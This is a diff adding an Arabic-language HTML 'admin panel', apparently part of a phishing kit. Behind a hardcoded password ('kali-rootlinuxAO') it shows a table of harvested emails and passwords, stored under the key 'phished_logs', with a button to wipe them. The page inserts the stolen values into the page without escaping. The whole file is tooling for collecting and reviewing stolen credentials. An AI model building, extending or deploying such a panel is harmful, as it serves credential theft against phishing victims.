@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0d1117; font-family: system-ui, monospace; color: #c9d1d9; padding: 20px; text-align: center; }
+        .login-box { margin: 100px auto; padding: 30px; background: #161b22; border: 1px solid #30363d; border-radius: 8px; max-width: 350px; }
+        .dashboard { display: none; max-width: 800px; margin: 50px auto; }
+        input { padding: 10px; width: 200px; background: #0d1117; border: 1px solid #30363d; color: white; margin: 10px 0; }
+        button { padding: 10px 20px; background: #238636; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #161b22; }
+        th { background: #238636; padding: 10px; }
+        td { padding: 10px; border-bottom: 1px solid #30363d; }
+        .error { color: #ff7b72; }
+    </style>
+</head>
+<body>
+<div id="loginBox" class="login-box">
+    <h2>🔐 لوحة الإدارة</h2>
+    <input type="password" id="passField" placeholder="أدخل كلمة المرور">
+    <br><button onclick="login()">دخول</button>
+    <p id="errorMsg" class="error"></p>
+</div>
+<div id="dashboard" class="dashboard">
+    <h2>📧 البيانات المُجمعة</h2>
+    <table id="dataTable">
+        <thead><tr><th>البريد الإلكتروني</th><th>كلمة المرور</th><th>التاريخ</th></tr></thead>
+        <tbody></tbody>
+    </table>
+    <br><button onclick="clearData()">مسح جميع البيانات</button>
+</div>
+<script>
+    const ADMIN_PASSWORD = 'kali-rootlinuxAO';
+    const STORAGE_KEY = 'phished_logs';
+
+    function login() {
+        if (document.getElementById('passField').value === ADMIN_PASSWORD) {
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            renderTable();
+        } else {
+            document.getElementById('errorMsg').innerText = 'كلمة المرور غير صحيحة!';
+        }
+    }
+    function renderTable() {
+        const data = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+        const tbody = document.querySelector('#dataTable tbody');
+        tbody.innerHTML = data.map(d => `<tr><td>${d.email}</td><td>${d.pass}</td><td>${d.time}</td></tr>`).join('');
+    }
+    function clearData() {
+        if (confirm('مسح جميع البيانات؟')) {
+            localStorage.removeItem(STORAGE_KEY);
+            renderTable();
+        }
+    }
+</script>
+</body>
+</html>
